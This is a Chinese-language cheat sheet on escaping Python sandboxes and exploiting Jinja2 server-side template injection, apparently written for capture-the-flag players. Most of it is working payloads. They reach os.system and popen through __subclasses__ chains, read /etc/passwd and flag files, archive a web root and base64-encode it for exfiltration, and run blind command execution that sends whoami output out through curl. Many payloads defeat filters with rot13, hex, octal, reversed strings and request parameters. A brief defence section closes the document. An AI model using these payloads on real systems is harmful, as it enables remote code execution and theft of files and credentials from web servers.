# python沙箱逃逸总结
沙箱逃逸,就是在给我们的一个代码执行环境下,脱离种种过滤和限制,最终成功拿到shell权限的过程。其实就是闯过重重黑名单，最终拿到系统命令执行权限的过程。以下是一些绕过python沙箱保护并执行任意命令的技巧，换衣批评指正。

## 内建模块、函数
当我们启动一个python解释器时，即使没有创建任何变量或者函数，还是会有很多函数可以使用，我们称之为内建函数，与之所属的模块叫做内建模块。在python中，初始builtins模块提供内建名称空间到内建对象的映射。dir()函数用于向我们展示一个对象的属性有哪些，在没有提供对象的时候，将会提供当前环境所导入的所有模块，我们可以看到初始模块有哪些：
```sh
>>> dir()
['__annotations__', '__builtins__', '__doc__', '__loader__', '__name__', '__package__', '__spec__']
// 在 2.x 版本中，内建模块被命名为 __builtin__，到了 3.x 就成了 __builtins__
>>>
```
可以看到__builtins__是做为默认初始模块出现的，那么用dir()命令看看__builtins__成员：
```sh
>>> dir(__builtins__)
['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BlockingIOError', 'BrokenPipeError', 'BufferError', 'BytesWarning', 'ChildProcessError', 'ConnectionAbortedError', 'ConnectionError', 'ConnectionRefusedError', 'ConnectionResetError', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FileExistsError', 'FileNotFoundError', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'InterruptedError', 'IsADirectoryError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'ModuleNotFoundError', 'NameError', 'None', 'NotADirectoryError', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'PermissionError', 'ProcessLookupError', 'RecursionError', 'ReferenceError', 'ResourceWarning', 'RuntimeError', 'RuntimeWarning', 'StopAsyncIteration', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'TimeoutError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'WindowsError', 'ZeroDivisionError', '_', '__build_class__', '__debug__', '__doc__', '__import__', '__loader__', '__name__', '__package__', '__spec__', 'abs', 'all', 'any', 'ascii', 'bin', 'bool', 'breakpoint', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'exec', 'exit', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip']
>>>
```
看到很多熟悉的关键字。比如：```__import__```、str、len等。至此python解释器里能够直接使用某些函数，比如直接使用len()函数。

## 继承关系
python中对一个变量应用```__class__```方法能从一个变量实例转到对应的对象类型，python的继承机制,与java等语言不同,python允许多重继承。再得到对象类型后可进一步利用以下方法获取更多的继续类型。

```__base__``` //对象的一个基类，一般情况下是object，有时不是，这时需要使用下一个方法

```__mro__ ```//同样可以获取对象的基类，只是这时会显示出整个继承链的关系，是一个基类列表，object在最底层故在列表中的最后，通过__mro__[-1]可以获取到

```__subclasses__()``` //继承此对象的子类，返回一个列表

有这些类继承的方法，我们就可以从任何一个变量，回溯到基类中去，再获得到此基类所有实现的类，就可以获得到很多的类，进而调用更多的方法达到目的。

## 魔术函数
魔法方法是python内置方法，不需要主动调用，存在的目的是为了给python的解释器进行调用，几乎每个魔法方法都有一个对应的内置函数，或者运算符，当我们对这个对象使用这些函数或者运算符时就会调用类中的对应魔法方法，可以理解为重写内置函数。
```__dict__```: 类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里的。对象的__dict__中存储了一些self.xxx的一些东西，内置的数据类型没有__dict__属性，每个类有自己的__dict__属性。

```__globals__```: 该属性是函数特有的属性，记录当前文件全局变量的值，如果某个文件调用了os、sys等库，但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用globals属性访问全局的变量。该属性保存的是函数全局变量的字典引用。

```__getattribute__```: 实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。

## 支持命令执行的python库
```python
os.system("ls")
os.popen("ls").read()
commands.getstatusoutput("ls") 
commands.getoutput("ls")
commands.getstatus("file/path")
subprocess.call("ls", shell=True)
subprocess.Popen("ls", shell=True)
pty.spawn("ls")
pty.spawn("/bin/bash")
platform.os.system("ls")

#Import functions to execute commands
importlib.import_module("os").system("ls")
importlib.__import__("os").system("ls")
imp.load_source("os","/usr/lib/python3.8/os.py").system("ls")
imp.os.system("ls")
imp.sys.modules["os"].system("ls")
sys.modules["os"].system("ls")
__import__("os").system("ls")
import os
from os import *

#Other interesting functions
open("/etc/passwd").read()
open('/var/www/html/input', 'w').write('123')

#In Python2.7
execfile('/usr/lib/python2.7/os.py')
system('ls')
```
其中，open和read函数对于读取python沙盒中的文件以及编写一些可以绕过沙盒执行的代码非常有用。

## 沙盒逃匿思想
核心就是那几个魔术方法像是__mro__,```__base__```,这两个意思都是寻找父类，然后找到<type 'object'>(python2)或是<class 'object'>(python3)，然后寻找其子类，再去找命令执行或是文件读取的模块。
## **import相关**
对于防御者来说，最基础的思路，就是对代码的内容进行检查，最常见的方法呢，就是禁止引入敏感的包
```python
import re
code = open('code.py').read()
pattern  = re.compile('import\s+(os|commands|subprocess|sys)')
match = re.search(pattern,code)
if match:
    print "forbidden module import detected"
    raise Exception
```
用以上的几行代码，就可以简单的完成对于敏感的包的检测，我们知道要执行shell命令必须引入 os/commands/subprocess这几个包，对于攻击者来说该如何绕过呢，必须使用其他的引入方式
 * 1. import 关键字
 * 2. __import__函数
 * 3. importlib库

import 是一个关键字，因此，包的名字是直接以'tag'(标记)的方式引入的，但是对于函数和包来说，引入包的名字就是他们的参数，也就是说，将会以字符串的方式引入，我们可以对原始关键字做出种种处理来bypass掉源码扫描。
以__import__函数举例：
```python
f3ck = __import__("pbzznaqf".decode('rot_13'))
print f3ck.getoutput('ifconfig')
```
```python
#或者使用importlib 这一个库
import importlib
f3ck = importlib.import_module("pbzznaqf".decode('rot_13')
print f3ck.getoutput('ifconfig')
```
使用execfile：
```python
#pytho2
execfile('/usr/lib/python2.7/os.py')
system('ls')
#python3
with open('/usr/lib/python3.6/os.py','r') as f:
    exec(f.read())
system('ls')
```
```python
import sys
sys.modules['os']='/usr/lib/python2.7/os.py'
import os
```
## **```__builtins__```**
刚才的__import__函数同样也是一个builtin函数，常用的危险函数eval,exec,execfile也是__builtin__的
但是，有的时候你通过上述两种方式无法找到该模块，dir也不行。上述方法能够生效的前提是，在最开始有这样的程序语句import __builtin__，这个import的意义并不是把内建模块加载到内存中，因为内建早已经被加载了，它仅仅是让内建模块名在该作用域中可见。
如果把这些函数从__builtin__中删除,那么就不能够再直接使用了，解决办法：
```python
reload(__builtin__) #就可以重新得到完整的__builtin__模块了
# 但是reload也是__builtin__下面的函数，如果直接把它干掉，就没办法重新引入了，这个时候,我们该怎么呢
# 在python中,有一个模块叫做imp，然后我们就会重新得到完整的__builtin__模块了
import imp
imp.reload(__builtin__)
````
## **sys.modules**
sys.modules 是一个字典，里面储存了加载过的模块信息。如果 Python 是刚启动的话，所列出的模块就是解释器在启动时自动加载的模块。有些库例如 os 是默认被加载进来的，但是不能直接使用，原因在于 sys.modules 中未经 import 加载的模块对当前空间是不可见的。

如果将 os 从 sys.modules 中剔除，os 就彻底没法用了：
```python
>>> sys.modules['os'] = 'not allowed'
>>> import os
>>> os.system('ls')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
AttributeError: 'str' object has no attribute 'system'
>>>
```
解决办法是删了sys.modules['os']，会让Python重新加载一次os
```python
del sys.modules['os']
import os
os.system('ls')
# 或者
execfile('/usr/lib/python2.7/os.py')
system('ls')
```
## **Python2 POC**
```python
#命令执行payload
[].__class__.__base__.__subclasses__()[69].__init__.__globals__['os'].system('calc')
"".__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls")')
"".__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls")')
[].__class__.__base__.__subclasses__()[60].__init__.__globals__['linecache'].__dict__['os'].system('id')
"".__class__.__mro__[-1].__subclasses__()[29].__call__(eval,'__import__("os").system("calc")')
''.__class__.__mro__[2].__subclasses__()[60].__init__.func_globals['linecache'].os.popen('calc').read()
().__class__.__bases__[0].__subclasses__()[60].__init__.__getattribute__('func_global'+'s')['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('calc')
().__class__.__bases__[0].__subclasses__()[60]()._module.__builtins__['__import__']('os').system('calc')
().__class__.__bases__[0].__subclasses__()[60].__init__.func_globals.values()[13]["eval"]("__import__('os').system('calc')")
[].__class__.__base__.__subclasses__()[60].__init__.__globals__['__builtins__']['__imp'+'ort__']('os').__dict__['pop'+'en']('calc').read()
# 打包文件
().__class__.__bases__[0].__subclasses__()[60].__init__.__getattribute__('func_globals')['linecache'].__dict__['os'].__dict__['popen']('tar -czvf /tmp/www.tar.gz /home/ctf/www').read()
# base64 编码读取文件
().__class__.__bases__[0].__subclasses__()[60].__init__.__getattribute__('func_globals')['linecache'].__dict__['os'].__dict__['popen']('base64 /tmp/www.tar.gz').read()
# Or you could obtain the builtins from a defined function
get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
```
```python
#读取文件
"".__class__.__mro__[-1].__subclasses__()[40]("D:/flag").read()
```
## **Python3 POC**
```python
# read 函数，读文件
''.__class__.__mro__[-1].__subclasses__()[80].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()
"".__class__.__base__.__subclasses__()[96].__subclasses__()[0].__subclasses__()[0]('/flag').read()
().__class__.__bases__[0].__subclasses__()[80].__init__.__globals__['__builtins__']['eval']("open('/etc/passwd').read()")
# write 函数，写文件
().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')
# 执行任意命令
().__class__.__bases__[0].__subclasses__()[80].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls /var/www/html").read()' )
# 通过 system 执行任意命令
''.__class__.__base__.__subclasses__()[80].__init__.__globals__["sys"].modules["os"].system("whoami")
# 通过 popen 执行任意命令
{{''.__class__.__mro__[-1].__subclasses__()[298]('cat /flag',shell=True,stdout=-1).communicate()[0].strip()}}
().__class__.__bases__[0].__subclasses__()[80].__init__.__globals__['__builtins__']['__import__']('os').system('ls')
().__class__.__bases__[0].__subclasses__()[80].__init__.__globals__['__builtins__']['__import__']('os').popen('cat /etc/passwd').read()
().__class__.__bases__[0].__subclasses__()[80].__init__.['__builtins__']['__import__']('subprocess').Popen(['cat', '/etc/passwd']).read()
[].__class__.__base__.__subclasses__()[80].__init__.__globals__['__builtins__']['__imp'+'ort__']('os').__dict__['pop'+'en']('ls').read()
```
## **通用Payload**
```python
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='_ModuleLock' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}

{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}

{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{% for b in c.__init__.__globals__.values() %} {% if b.__class__ == {}.__class__ %}{% if 'eval' in b.keys() %}{{ b['eval']('__import__("os").popen("id").read()') }}{% endif %}{% endif %}{% endfor %} {% endif %}{% endfor %}

{% for x in ().__class__.__base__.__subclasses__() %}
    {% if "warning" in x.__name__ %}
        {{x()._module.__builtins__['__import__']('os').popen("ls").read()}}
    {%endif%}
{%endfor%}
# python2 decode hex
{% for a in []["5F5F636C6173735F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]["5F5F626173655F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]["5F5F737562636C61737365735F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]() %}
    {% if "7761726E696E67"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78") in a["5F5F6E616D655F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")] %}
        {{a()["5F6D6F64756C65"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]["5F5F6275696C74696E735F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]["5F5F696D706F72745F5F"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]("6F73"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78"))["706F70656E"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]("6563686F2024666C6167"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78"))["72656164"["\x64\x65\x63\x6F\x64\x65"]("\x68\x65\x78")]()}}
    {%endif%}
{%endfor%}
```
## **花式绕过总结**

### 绕过空格
```python
{(''|attr('__class__')}}，{(''['__class__'])}}
# 等价于
{{''.__class__}}
• 空格可以用tab(%09)绕过
• | 后不允许接a-z可以用%0c，tab等绕过
• os可以通过python中exec绕过
如果过滤仅限于 request.args 但是不允许 post，简单的办法是可以用request.cookies来绕过
```
### 绕过点.
```python
{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(64)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("cat /flag").read()')}}
{{''['__class__']['__mro__'][-1]['__subclasses__']()[65]['__init__']['__globals__']['__builtins__']['__import__']('os')['popen']('cat /flag')['read']()}}
{{ ''['__class__']['__base__']['__subclasses__']()[96]['__subclasses__']()[0]['__subclasses__']()[0]('/flag').read() }}
getattr(getattr(getattr(getattr(getattr(getattr(getattr([],'__cla'+'ss__'),'__mr'+'o__')[1],'__subclas'+'ses__')()[104],'__init__'),'__glob'+'al'+'s__')['sy'+'s'],'mod'+'ules')['o'+'s'],'sy'+'ste'+'m')('l'+'s')

```
### 绕过[]
```python
pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。
>>> ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()

使用 `__getitem__` `pop`

读文件：
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()

执行命令：
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('ls').read()

request.cookies["hh"]  ——> request.cookies.getitem("hh")
```
### 绕过引号
```python
request.args 是flask中的一个属性,为返回请求的参数,这里把path当作变量名,将后面的路径传值进来,进而绕过了引号的过滤
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&path=/etc/passwd

先获取chr函数，赋值给chr，后面拼接字符串就好了：

{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() }}

借助request对象(推荐)：

`request.args` 是flask中的一个属性,为返回请求的参数,这里把`path`当作变量名,将后面的路径传值进来,进而绕过了引号的过滤。

{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}&path=/etc/passwd

执行命令：
{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() }}

{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() }}&cmd=id

特别说明的是 chr 是没有办法在jinjia2模板中调用的。因为在沙盒中这个函数是不存在的。我们可以使用数字列表转化成字节流， 之后转化成字符串的方法。利用bytes， 但是 python3和 python2略有不同

# python3
In [156]: bytes([49, 43, 49])
Out[156]: b'1+1'
In [157]: eval(bytes([49, 43, 49]))
Out[157]: 2

py3利用：
from jinja2 import Template
attack_str = '__import__("sys").version'
attack_list = [ord(i) for i in attack]
attack_input='{{' + '[].__class__.__base__.__subclasses__()[166].__init__.__globals__.__builtins__.eval([].__class__.__base__.__subclasses__()[6]({attack_list}))'.format(attack_list=attack_list) + '}}'

print(attack_input)
#output {{[].__class__.__base__.__subclasses__()[166].__init__.__globals__.__builtins__.eval([].__class__.__base__.__subclasses__()[6]([95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 115, 121, 115, 34, 41, 46, 118, 101, 114, 115, 105, 111, 110]))}}

Template('{user_input}'.format(user_input=attack_input)).render()

#output '3.6.1 (default, Mar 23 2017, 16:49:06) \n[GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.42.1)]'

py2利用

python2 的catch_warnings在59的位置， 另外 python2 的 eval 不接受字节流， 需要特别调用`__str__`方法来转化成字符串。其余和 python3相同。
Template('{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__.__builtins__.eval([].__class__.__base__.__subclasses__()[6]([95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 115, 121, 115, 34, 41, 46, 118, 101, 114, 115, 105, 111, 110]).__str__())}}').render()

#output u'2.7.10 (default, Feb  6 2017, 23:53:20) \n[GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]'
```
### 绕过下划线
```python
同样利用request.args属性

{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&class=__class__&mro=__mro__&subclasses=__subclasses__

将其中的request.args改为request.values则利用post的方式进行传参
GET: {{ ''[request.value.class][request.value.mro][2][request.value.subclasses]()[40]('/etc/passwd').read() }} 
POST: class=__class__&mro=__mro__&subclasses=__subclasses__
爆破
text={% if request.values.e[18] == ()[request.values.a][request.values.b][request.values.c]()[40](request.values.d).read()[0]%}good{%endif%}&a=__class__&b=__base__&c=__subclasses__&d=/flag&e=}-{0123456789abcdefghijklmnopqrstuvwxyz
```
### 绕过关键字过滤
```python
base64编码绕过
__getattribute__使用实例访问属性时,调用该方法
例如被过滤掉__class__关键词
{{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()}}

字符串拼接绕过
{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()}}

当要调用对象的方法如下
1	>>> dir([]).__class__
2	<type 'list'>
3	>>> [].__class__
4	<type 'list'>
5	>>> dir([])['__class__']
但是flask和django的模板注入还有一种内置方法
1	request.__class__ 效果等于 request|attr('__class__')
通过参数引入字符串
1	/?secret={{request.args.class.join((request.args.usc*2,request.args.usc*2))}}&usc=_&class=class
通过设定变量提前创建好变量
1	/?secret={%set%09class=request.args.class.join((request.args.usc*2,request.args.usc*2))%}{{class}}&usc=_&
```
### 过滤双下划线__
```python
同样利用`request.args`属性
{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&class=__class__&mro=__mro__&subclasses=__subclasses__
题目练习：文尾参考3中的*QCTF-Confustion1*
```
```python
{{''["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fmro\x5f\x5f"][1]["\x5f\x5fsubclasses\x5f\x5f"]()[64]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]('os')["popen"]("ls")["read"]()}}

{%print%0a(lipsum|attr("\137\137\147\154\157\142\141\154\163\137\137"))|attr("\137\137\147\145\164\151\164\145\155\137\137")("\137\137\142\165\151\154\164\151\156\163\137\137")|attr("\137\137\147\145\164\151\164\145\155\137\137")("\145\166\141\154")("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\160\157\160\145\156\50\47\143\141\164\40\57\146\154\141\147\47\51\56\162\145\141\144\50\51")%}

```
### 过滤{{
```python
可以利用{%%}标记

{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}1{% endif %}

相当于盲命令执行，利用curl将执行结果带出来

如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来

{% if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()[0:1]=='p' %}~p0~{% endif %}
```
### 借助request绕过
```python
大概的原理是这样的，一般检查的时候只是检查url链接中的关键字，并没有对参数和cookies进行检查，那么我们就可以使用变量和数值的方法，url中使用变量代替我们的关键字，在参数中将实际的值附上，代码和讲解如下：

第一个是关于request的有关知识，我们知道这是一个用于web请求的库，它是存在有关参数的用法的，在《Flask request获取参数问题》一文中曾经提到过，分别通过3中方式获取参数:request.form, request.args,request.values

request.form.get("key", type=str, default=None) 获取表单数据
request.args.get("key") 获取get请求参数
request.values.get("key") 获取所有参数

毫无疑问如果要用魔法函数，那么必须就要使用`_`
 jinja2模板中有很多有用的内置过滤器，可以[“看看这”](http://docs.jinkan.org/docs/jinja2/templates.html#builtin-filters)这里我要介绍的是`attr`和`join`这两个过滤器。`{{request|attr("get")}}`就相当于`{{request.get}}`。`{{request|attr(["_"*2,"class","_"*2]|join)}}`相当于`{{request.__class__}}` 但是我们这样似乎还是无法过滤`_` ，因为还是要输入才行呀。不过，我们前面讲过，被过滤的关键字和字符我们可以从`request`里取出，我们可以在get、post、header、cookies里传一个值，然后用`request.cookies['var']`获取。

import requests
# 注意是两对{}，上文已经讲过为什么了，这里用的是cookies的方式
url = '''http://47.96.118.255:2333/{{''[request.cookies.a][request.cookies.b][2][request.cookies.c]()[40]('a.php')[request.cookies.d]()}}'''
cookies = {}
cookies['a'] = '__class__'
cookies['b'] = '__mro__'
cookies['c'] = '__subclasses__'
cookies['d'] = 'read'
print requests.get(url,cookies=cookies).text

当然，我们也可以构造get的参数来传递：
www.a.com/login.php{{''[request.args.clas][request.args.mr][2][request.args.subclas]()[40]('a.php').__getattribute__('rea'+'d')()}}
?clas=__class__&mr=__mro__&subclas=__subclasse__
理论上，可以用这种方法绕过任何关键字过滤。更多请见参考5。
```
```python
{{''.__class__}} => {{''[request.args.t1]}}&t1=__class__
{{''.__class__}} => {{''[request['args']['t1']]}}&t1=__class__
{{''.__class__}} => {{''|attr(request['values']['x1'])}}&t1=__class__

url?name={{()|attr(request['values']['x1'])|attr(request['values']['x2'])| attr(request['values']['x3'])()|attr(request['values']['x6'])(233)| attr(request['values']['x4'])| attr(request['values']['x5'])| attr(request['values']['x6'])(request['values']['x7'])| attr(request['values']['x6'])(request['values']['x8'])(request['values']['x9'])}}

x1=__class__&x2=__base__&x3=__subclasses__&x4=__init__&x5=__globals__&x6=__getitem__&x7=__builtins__&x8=eval&x9=__import__("os").popen('cat /fl4g|base64').read()
```
### base64编码绕过
```
`__getattribute__`使用实例访问属性时,调用该方法，例如被过滤掉`__class__`关键词
{{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()}}
```
### 字符串拼接绕过
```python
{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()}}
{{''['__c'+'lass__'].__base__.__subclasses__()[40]("/etc/passwd").read()}}
```
### 字符串翻转绕过
```python
().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['lave'[::-1]]("__import__('so'[::-1]).system('whoami')")
().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['lave'[::-1]]("__import__('so'[::-1]).system('whoami')")   
```
### 模块删除绕过
```python
注意一种简单题型，出题者只做了如下一些处理：
>>> del __builtins__.__dict__['__import__'] # __import__ is the function called by the import statement
>>> del __builtins__.__dict__['eval'] # evaluating code could be dangerous
>>> del __builtins__.__dict__['execfile'] # likewise for executing the contents of a file
>>> del __builtins__.__dict__['input'] # Getting user input and evaluating it might be dangerous
看起来好像已经非常安全是么？但是，`reload(module)` 重新加载导入的模块，并执行代码 即可。但是,`reload`也是`__builtins__`下面的函数,如果直接把它干掉,就没办法重新引入了。这个时候,我们该怎么呢
在python中,有一个模块叫做imp,是有关引入的一个模块
我们可以使用

import imp
imp.reload(__builtins__)
结果：
<module '__builtin__' (built-in)>
然后我们就会重新得到完整的`__builtin__`模块了。导入模块的方式：
- 最直接的import
- 内置函数 `__import__`
以commands模块为例:
f3ck = __import__("pbzznaqf".decode('rot_13'))
print f3ck.getoutput('ifconfig')
- importlib库
以python commands模块为例:
import importlib
f3ck = importlib.import_module("pbzznaqf".decode('rot_13 ```')
print f3ck.getoutput('ifconfig')
```
### 防御方法
```python
SSTI（服务端模板注入）。通过 SSTI 控制 Web 应用渲染模板（基于 Jinja2）内容，可以轻易的进行远程代码（命令）执行。当然了，一切的前提都是模板内容可控，虽然这种场景并不常见，但难免会有程序员疏忽会有特殊的需求会让用户控制模板的一些内容。
在 Jinja2 模板中防止利用 Python 特性执行任意代码，可以使用 Jinja2 自带的沙盒环境 jinja2.sandbox.SandboxedEnvironment，Jinja2 默认沙盒环境在解析模板内容时会检查所操作的变量属性，对于未注册的变量属性访问都会抛出错误
from jinja2.sandbox import SandboxEnviroment
env = SandboxedEnviroment()
env.from_string("模板内容，参数")
```
## 参考资料
【Escaping the Python Sandbox】https://zolmeister.com/2013/05/escaping-python-sandbox.html<br>
【Sandbox Escape with Python】https://prog.world/sandbox-escape-with-python/<br>
【】http://www.secwk.com/2019/10/17/11283/<br>
【】https://www.cnblogs.com/tr1ple/p/9415641.html<br>
【】https://www.freebuf.com/articles/system/203208.html<br>
【】https://0day.work/jinja2-template-injection-filter-bypasses/<br>
【】https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes<br>
